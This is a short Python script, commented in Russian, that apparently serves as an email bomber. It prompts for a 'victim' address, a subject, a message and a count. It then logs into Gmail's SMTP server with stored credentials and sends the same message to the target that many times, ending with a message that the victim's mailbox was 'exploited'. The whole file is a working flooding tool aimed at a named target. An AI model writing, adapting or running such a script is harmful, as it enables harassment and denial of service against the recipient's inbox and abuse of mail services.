from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from logpass import myemail, password
slave=[]
slave.append(input("введите почту жертвы: "))
team = input("введите тему сообщения: ")
message = input("Введите сообщение : ")
col = int(input("введите колличество спама: "))


msg = MIMEMultipart()
msg['From'] = myemail
msg['Subject'] = team
msg.attach(MIMEText(message))
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(msg['From'], password)

for i in range(0,len(slave)):
    NewCol = col
    while NewCol > 0:
        server.sendmail(msg['From'], str(slave[i]), msg.as_string())
        NewCol -= 1


server.quit()
print("Почта жертвы успешно проэксплотированна %s:" % (slave))